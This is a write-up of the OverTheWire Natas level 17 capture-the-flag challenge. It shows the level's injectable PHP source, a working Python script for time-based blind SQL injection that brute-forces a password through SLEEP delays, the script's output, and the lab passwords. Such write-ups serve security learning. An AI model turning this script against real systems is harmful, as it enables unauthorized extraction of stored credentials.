+++
author = "Alex Domnit"
title = 'Natas-Level 17'
date = 2024-08-25T21:17:22+03:00
draft = false
description = "Writeup"
tags = [
    "CTF",
    "Completed",
]
categories = [
    "Overthewire",
    "Natas",
]

toc = false
+++

### Login
*Username: natas17*\
*Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC*\
*URL:      http://natas17.natas.labs.overthewire.org*

#### [Solution idea](https://medium.com/@samarthkokil64/overthewire-updated-natas-walkthrough-level-17-00dd519c7689)

### Doc
[What is brute-forcing?](https://en.wikipedia.org/wiki/Brute-force_attack)\
In cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.\
[What is python?](https://en.wikipedia.org/wiki/Python_(programming_language))\
Python is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.\
[What is php?](https://en.wikipedia.org/wiki/PHP)\
PHP is a general-purpose scripting language geared towards web development. It was originally created by Danish-Canadian programmer Rasmus Lerdorf in 1993 and released in 1995. The PHP reference implementation is now produced by the PHP Group.\
[What is SQL?](https://en.wikipedia.org/wiki/SQL)\
Structured Query Language is a domain-specific language used to manage data, especially in a relational database management system. It is particularly useful in handling structured data, i.e., data incorporating relations among entities and variables.\
[What is SQL injection?](https://en.wikipedia.org/wiki/SQL_injection)\
In computing, SQL injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution.


### Solution
The index page of **natas17** presents us with a **Username** field and a **check existance** button just like in the previous levels.

Let\`s check the Source code:
{{< highlight html >}}
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</script></head>
<body>
<h1>natas17</h1>
<div id="content">
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
{{< /highlight >}}
This solution seems to be based again on some sort of SQL injection. Let\`s break down the code and find the important snippets.

```
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} 
```
This seems to be the part where the magic happens. It is very similar to a SQL injection we used previously, the caviat here being that there`s no ouput so we can not be sure if the data we bring into the equation is correct or not. We could use a timeout after the query tho in order to see what happens since if the query is returning somehting, the timeout will execute, otherwise it will just skip to the next iteration.\
For that, a script similar to the last SQL injection will be necessary. We can just slightly modify the already completed script in order to adapt it to <strong>natas17</strong>.\
<strong>Code:</strong>
```
import requests
import re
from time import *

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"

Url = "http://natas17.natas.labs.overthewire.org"

session = requests.session()

current_password = list()

while(True):
    for character in characters:
        print("Trying with: " + "".join(current_password) + character)
        startTime = time()
        response = session.post(Url, data={"username": 'natas18" AND password LIKE BINARY "' + "".join(current_password) + character + '%" AND SLEEP(2) #'},auth=(username, password))
        endTime = time()
        if endTime - startTime > 2:
            current_password.append(character)
            break
    if len(current_password) == 32:
            break
```
<strong>Script run:</strong>
```
02:28:04 archie@Archie py → python3 script.py
Trying with: a
Trying with: b
Trying with: c
Trying with: d
Trying with: e
Trying with: f
Trying with: g
Trying with: h
Trying with: i
Trying with: j
Trying with: k
Trying with: l
Trying with: m
Trying with: n
Trying with: o
.
.
.
Trying with: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```
<strong>The code is not my intelectual property and was adapted from "see header".</strong>